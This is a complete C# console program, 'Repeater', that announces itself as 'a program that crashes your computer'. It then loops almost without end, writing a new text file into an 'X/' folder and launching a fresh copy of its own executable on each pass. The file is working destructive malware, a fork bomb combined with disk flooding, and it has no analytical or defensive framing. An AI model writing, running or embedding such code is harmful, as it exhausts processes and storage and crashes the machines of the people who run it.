using System;
using System.Threading;
using System.Diagnostics;
using System.IO;
using System.Reflection;
namespace Repeater
{
    public static class Repeat
    {
        public const string InternalVersion = "1.0.9";
        public static ulong x = ulong.MinValue;
        public static string XDir = "X/",
            Prgm = Assembly.GetExecutingAssembly().GetName().Name,
            Message = "You just launched a program that crashes your computer!";
        public static void Main(string[] _)
        {
            Console.Title = "Repeater (XDir) v" + InternalVersion;
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.BackgroundColor = ConsoleColor.DarkRed;
            Console.Out.WriteLine(Message);
            if (Directory.Exists(XDir))
            {
                Directory.Delete(XDir);
            }
            else
            {
                Directory.CreateDirectory(XDir);
            }
            Thread.Sleep(100);
            while (x != ulong.MaxValue)
            {
                Console.Out.Flush();
                x++;
                string StrX = x.ToString(),
                    XPath = XDir + StrX + ".txt";
                File.AppendAllText(XPath, StrX);
                Console.Out.Write('\r' + StrX);
                Console.Out.Flush();
                Process.Start(Prgm + ".exe");
            }
        }
    }
}